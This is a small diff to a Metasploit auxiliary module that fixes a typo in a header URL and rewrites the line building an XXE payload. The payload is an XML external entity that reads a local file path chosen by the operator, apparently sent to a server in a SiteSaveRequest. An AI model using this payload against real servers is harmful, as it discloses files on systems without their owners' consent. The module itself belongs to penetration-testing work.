@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -74,7 +74,7 @@ class Metasploit4 < Msf::Auxiliary
 
     xml = '<!DOCTYPE foo ['
     xml << '<!ELEMENT host ANY>'
-    xml << '<!ENTITY xxe SYSTEM "file://' << datastore['FILEPATH'] << '">'
+    xml << %Q{<!ENTITY xxe SYSTEM "file://#{datastore['FILEPATH']}">}
     xml << ']>'
     xml << '<SiteSaveRequest session-id="'
 
